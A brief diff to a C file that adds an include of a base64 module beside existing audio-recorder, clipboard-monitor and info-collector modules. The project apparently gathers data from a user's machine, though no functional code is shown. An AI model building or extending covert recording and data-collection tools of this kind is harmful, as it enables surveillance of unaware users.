@@ -5,6 +5,7 @@
 #include <string.h>
 #include <time.h>
 
+#include "base64.c"
 #include "audio_recorder.c"
 #include "clipboard_monitor.c"
 #include "info_collector.c"
